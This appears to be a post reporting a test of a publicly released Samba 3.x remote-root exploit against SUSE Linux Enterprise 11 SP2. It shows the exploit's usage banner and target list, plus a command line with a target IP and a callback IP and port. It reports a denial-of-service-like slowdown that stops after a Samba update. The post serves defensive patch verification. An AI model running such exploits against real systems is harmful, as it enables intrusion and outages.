There's a samba exploit released to public in the mailinglist of
Full-disclosure:

http://lists.grok.org.uk/pipermail/full-disclosure/2012-September/088458.html

I tested the exploit( http://pastebin.com/AwpsBWVQ) on the specific
environment:

---------------------------------------------------------
OS: SLES 11 SP2
samba: 3.6.3-0.18.3-2749-SUSE-CODE11-x86_64
other: Turn off SUSE Firewall

command-line:
+--------------------------------------------------------------------
shawn@bt:/info_security/exploit-research/exps$ python samba-0day.py 

 {*} samba 3.x remote root by kd(eax)@ireleaseyourohdayfuckyou {*}

  usage: samba-0day.py <targethost> <targetport> <myip> <myport> <target>

  targets:
    00) samba_3.6.3-debian6
    01) samba_3.5.11~dfsg-1ubuntu2.1_i386 (oneiric)
    02) target_finder (hardcode correct system addr)

shawn@bt:/info_security/exploit-research/exps$ python samba-0day.py
147.2.212.96 139 147.2.215.224 8889 02
{+} TRYING EIP=0xb6d1a3c0 OFFSET=0x00001f94

+--------------------------------------------------------------------
Result: The target machine became very slow( unavailable to use). It
seems like a DOS-similar attack. When I interrupted execution of the
exploit, the target machine can work again but still slower than
before attack.

Then, I upgraded the samba to 3.6.3-0.24.4-2794-SUSE-CODE11-x86_64 by
YaST. The target machine is fine after 30-mins attack. This exploit
won't affect this samba version.
